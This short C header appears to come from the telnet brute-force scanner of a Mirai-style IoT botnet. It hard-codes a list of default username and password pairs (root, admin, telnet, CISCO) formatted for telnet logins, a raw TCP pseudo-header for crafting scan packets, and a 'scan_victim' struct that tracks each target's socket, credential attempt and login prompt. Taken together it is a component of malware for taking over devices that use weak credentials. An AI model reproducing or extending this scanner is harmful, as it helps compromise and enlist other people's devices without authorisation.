#pragma once

// Need static as it's only in this function

static char *usernames[] =
{
	"root\r\n\0", // root:root
	"root\r\n\0", // root:1234
	"root\r\n\0", // root:12345
	"admin\r\n\0", // admin:admin
	"telnet\r\n\0", // telnet:telnet
	"CISCO\r\n\0", // CISCO:CISCO
};

static char *passwords[] =
{
	"root\r\n\0", // root:root
	"1234\r\n\0", // root:1234
	"12345\r\n\0", // root:12345
	"admin\r\n\0", // admin:admin
	"telnet\r\n\0", // telnet:telnet
	"CISCO\r\n\0"
};

struct pseudo_header
{ //needed for checksum calculation
	unsigned int   source_address;
	unsigned int   dest_address;
	unsigned char  placeholder;
	unsigned char  protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};

struct scan_victim
{
	ipv4_t ip;
	uint8_t state;
	int32_t sock;
	int  user;
	int  pass;
	char prompt[5]; // How the prompt looks to match it and collect data
};

void scan_init();
bool scan_scanner();
